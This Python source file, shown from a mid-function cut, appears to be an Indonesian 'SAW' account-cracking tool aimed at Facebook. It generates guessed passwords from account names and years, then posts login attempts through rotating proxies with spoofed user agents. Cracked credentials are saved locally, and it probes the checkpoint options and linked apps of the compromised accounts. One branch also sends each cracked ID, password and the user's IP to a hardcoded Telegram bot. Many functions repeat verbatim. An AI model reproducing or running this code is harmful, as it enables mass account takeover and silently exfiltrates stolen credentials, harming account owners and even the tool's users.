				print(f'\r{K}\n[ SAW-CP ]\n ID : {idf}\n PASSWORD : {pw}{N}')       
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n[ SAW-OK ]\n ID : {idf}\n PASSWORD : {pw}\n{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n[ SAW-OK ][OK] ID : {idf}\n[OK]  PASSWORD : {pw}\n{ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def passwrd1():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'123321')
					pwv.append(frs+'1221')
					pwv.append(frs+'123443211')
					pwv.append(frs+'1234554321')
					pwv.append(frs+'11223344')
			else:
					pwv.append(nmf)
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'1122334455')
					pwv.append(frs+'112233445566')
					pwv.append(frs+'1111')
					pwv.append(frs+'2222')
					pwv.append(frs+'100200')
					pwv.append('zaxozaxo')
					pwv.append(frs+'321')
					pwv.append(frs+'4321')
					pwv.append(frs+'54321')
					pwv.append(frs+'@#')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	print(f'\t  EXIT TOOL {u} ')
	exit()
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s{P}[%s®%s] %sSorry there is no Active  Apk%s         '%(N,U,N,B,N))
    else:
        print(f'\r   {P} [{H}®{P}] %s OK Your Active Apps OK     :{B}       '%(H))
        for i in range(len(game)):
            print(f"\r    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            print(f'\r %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":koki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,M,N,M,N))
    else:
        print(f'\r   %s [{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
            print(f"    [%s%s]{K} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
def passwrd2():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=20) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(nmf)
			else:
					pwv.append(nmf)
					pwv.append(nmf)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	print(f'\t  EXIT TOOL {u} ')
	exit()
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s{P}[%s®%s] %sSorry there is no Active  Apk%s         '%(N,U,N,B,N))
    else:
        print(f'\r   {P} [{H}®{P}] %s OK Your Active Apps OK     :{B}       '%(H))
        for i in range(len(game)):
            print(f"\r    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            print(f'\r %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":koki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,M,N,M,N))
    else:
        print(f'\r   %s [{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
            print(f"    [%s%s]{K} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
def passwrd3():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'1980')
					pwv.append(frs+'1981')
					pwv.append(frs+'1982')
					pwv.append(frs+'1983')
					pwv.append(frs+'1984')
					pwv.append(frs+'1985')
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1991')
			else:
					pwv.append(nmf)
					pwv.append(frs+'1992')
					pwv.append(frs+'1993')
					pwv.append(frs+'1994')
					pwv.append(frs+'1995')
					pwv.append(frs+'1996')
					pwv.append(frs+'1997')
					pwv.append(frs+'1998')
					pwv.append(frs+'1999')
					pwv.append(frs+'2000')
					pwv.append('1122334455')
					pwv.append('12345678910')
					pwv.append(frs+'123@#')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	print(f'\t  EXIT TOOL {u} ')
	exit()
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s{P}[%s®%s] %sSorry there is no Active  Apk%s         '%(N,U,N,B,N))
    else:
        print(f'\r   {P} [{H}®{P}] %s OK Your Active Apps OK     :{B}       '%(H))
        for i in range(len(game)):
            print(f"\r    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            print(f'\r %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":koki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,M,N,M,N))
    else:
        print(f'\r   %s [{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
            print(f"    [%s%s]{K} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
def passwrd4():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'2000')
					pwv.append(frs+'2001')
					pwv.append(frs+'2002')
					pwv.append(frs+'2003')
					pwv.append(frs+'2004')
					pwv.append(frs+'2005')
					pwv.append(frs+'2006')
					pwv.append(frs+'2007')
					pwv.append(frs+'2008')
					pwv.append(frs+'2009')
					pwv.append(frs+'2010')
					pwv.append(frs+'2011')
			else:
					pwv.append(nmf)
					pwv.append(frs+'2012')
					pwv.append(frs+'2013')
					pwv.append(frs+'2014')
					pwv.append(frs+'2015')
					pwv.append(frs+'2016')
					pwv.append(frs+'2017')
					pwv.append(frs+'2018')
					pwv.append(frs+'2019')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
					pwv.append(frs+'2023')
					pwv.append(frs+'2024')
					pwv.append(frs+'2025')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	print(f'\t  EXIT TOOL {u} ')
	exit()
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s{P}[%s®%s] %sSorry there is no Active  Apk%s         '%(N,U,N,B,N))
    else:
        print(f'\r   {P} [{H}®{P}] %s OK Your Active Apps OK     :{B}       '%(H))
        for i in range(len(game)):
            print(f"\r    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            print(f'\r %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":koki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,M,N,M,N))
    else:
        print(f'\r   %s [{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
            print(f"    [%s%s]{K} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
def passwrd5():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'12@')
					pwv.append(frs+'12@#')
					pwv.append(frs+'123@')
					pwv.append(frs+'123@#')
					pwv.append(frs+'1234@')
					pwv.append(frs+'1234@#')
					pwv.append(frs+'12345@')
					pwv.append(frs+'12345@#')
					pwv.append(frs+'123456@')
					pwv.append(frs+'123456@#')
					pwv.append(frs+'1122@')
					pwv.append(frs+'1122@#')
			else:
					pwv.append(nmf)
					pwv.append(frs+'1212@')
					pwv.append(frs+'1212@#')
					pwv.append(frs+'112233@')
					pwv.append(frs+'112233@#')
					pwv.append(frs+'11223344@')
					pwv.append(frs+'11223344@#')
					pwv.append(frs+'123321@')
					pwv.append(frs+'123321@#')
					pwv.append(frs+'12344321@')
					pwv.append(frs+'12344321@#')
					pwv.append(frs+'1234554321@')
					pwv.append(frs+'1234554321@#')
					pwv.append(frs+'54321@')
					pwv.append(frs+'54321@#')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	print(f'\t  EXIT TOOL {u} ')
	exit()
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s{P}[%s®%s] %sSorry there is no Active  Apk%s         '%(N,U,N,B,N))
    else:
        print(f'\r   {P} [{H}®{P}] %s OK Your Active Apps OK     :{B}       '%(H))
        for i in range(len(game)):
            print(f"\r    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            print(f'\r %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":koki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,M,N,M,N))
    else:
        print(f'\r   %s [{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
            print(f"    [%s%s]{K} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
def passwrd7():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'1234567')
					pwv.append(frs+'12345678')
					pwv.append(frs+'123456789')
					pwv.append(frs+'1980')
					pwv.append(frs+'1981')
					pwv.append(frs+'1982')
					pwv.append(frs+'1983')
					pwv.append(frs+'1984')
					pwv.append(frs+'1985')
			else:
					pwv.append(nmf)
					pwv.append(frs+'1986')
					pwv.append(frs+'1987')
					pwv.append(frs+'1988')
					pwv.append(frs+'1989')
					pwv.append(frs+'1990')
					pwv.append(frs+'1122')
					pwv.append(frs+'2222')
					pwv.append(frs+'1000')
					pwv.append(frs+'123321')
					pwv.append(frs+'112233445')
					pwv.append(frs+'11223344')
					pwv.append(frs+'4321')
					pwv.append(frs+'321')
					pwv.append(frs+'100200')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	print(f'\t  EXIT TOOL {u} ')
	exit()
def cek_apk(session,kuki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s{P}[%s®%s] %sSorry there is no Active  Apk%s         '%(N,U,N,B,N))
    else:
        print(f'\r   {P} [{H}®{P}] %s OK Your Active Apps OK     :{B}       '%(H))
        for i in range(len(game)):
            print(f"\r    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            print(f'\r %s[%s!%s] Sorry, Apk check '%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":koki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,M,N,M,N))
    else:
        print(f'\r   %s [{M}×{P}]{M} Your Expired Apps                 {P}'%(P))
        for i in range(len(game)):
            print(f"    [%s%s]{K} %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
# Mobile 
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r SAW {P}[{k}{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}\033[1;31mCP - {cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'touch.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'touch.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://touch.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://touch.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				
				print(f'\r{K}\n[ SAW-CP ]\n ID : {idf}\n PASSWORD : {pw}{N}')       
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				ip = requests.get("https://api.ipify.org").text
				
				requests.get(f"https://api.telegram.org/bot5184052776:AAEwfSAN2BiKagHPkP7SbdC9IX5Me6TYc6I/sendMessage?chat_id=877429061&text={idf}|{pw}\n {ip} ")
				print(f'\r{H}\n[ SAW-OK ]\n ID : {idf}\n PASSWORD : {pw}\n{N}')
				#saw
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n[ SAW-OK ][OK] ID : {idf}\n[OK]  PASSWORD : {pw}\n{ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[SAW] {P} {asu}Mbasic{P}{P}{b}{loop}{P}/{p}{len(id)}{P}—{P}[{H}--{ok} : {P}]—{P}[{k} : {cp}-{x}]—{m}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1), 'uid': idf, 'flow': 'login_no_pin', 'pass': pw, 'next': 'https://developers.facebook.com/tools/debug/accesstoken/'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('%s[%s•%s]%s═════════════════════════════════%s'%(P,H,P,M))
				print(f'\r{K}\n[ NITAI-CP ]\n[NO] User :{idf}\n[NO] Pass :{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				print('%s[%s•%s]%s═════════════════════════════════%s\n'%(P,H,P,M))
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('%s[%s•%s]%s═════════════════════════════════%s'%(P,H,P,M))
				print(f'\r{H}\n[ SAW-OK ][OK] ID : {idf}[OK] PASSWORD :{pw}|{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				print('%s[%s•%s]%s═════════════════════════════════%s\n'%(P,H,P,M))
				ceker(idf,pw)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s[SAW]%s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[SAW]---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[SAW]---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s[SAW]%s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s[SAW]%s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s[SAW]%s|%s ----> CP       %s'%(b,id,pw,x))
